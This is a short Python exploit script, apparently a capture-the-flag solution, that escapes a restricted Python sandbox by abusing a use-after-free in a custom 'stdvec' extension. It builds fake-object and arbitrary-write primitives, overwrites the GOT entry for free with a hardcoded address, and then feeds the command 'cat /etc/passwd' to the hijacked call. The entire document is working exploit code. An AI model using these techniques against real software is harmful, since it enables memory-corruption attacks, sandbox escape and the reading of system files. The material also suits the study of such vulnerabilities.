import stdvec

from sys import modules
del modules['os']


keys = list(__builtins__.__dict__.keys())
for k in keys:
    # present for you
    if k not in ['int', 'id', 'print', 'range', 'hex', 'bytearray', 'bytes']:
        del __builtins__.__dict__[k]


def p64_bytearray(num):
	v = bytearray(8)
	for i in range(8):
		bt = (num >> (i * 8)) & 0xFF
		v[i] = bt
	return v

def p64(num):
	v = bytearray(8)
	for i in range(8):
		bt = (num >> (i * 8)) & 0xFF
		v[i] = bt
	return bytes(v)


def fakeobj(address):
	victim = stdvec.StdVec()

	for i in range(0x100):
		victim.append(0)

	counter = 0
	for x in victim:
		# this frees the back of the current iterator
		for j in range(0x1000):
			victim.append(0)
		reclaim = bytearray(0x800)
		reclaim[0x8:0x10] = p64_bytearray(address)
		if counter == 1:
			return x
		counter += 1

def arbitrary_write(address, value):
	master[0x20:0x28] = p64_bytearray(address)
	master[0x28:0x30] = p64_bytearray(address)
	slave[0:0x8] = p64_bytearray(value)

slave = bytearray(0x100)
string = p64(0xff)+p64(10595392)+p64(0x100)+p64(0x100)+p64(id(slave))*2
master = fakeobj(id(string) + 0x20)

foo = 0x421080
free_got = 0xA00520 
arbitrary_write(free_got, foo)

a = "cat /etc/passwd\x00"
print(a)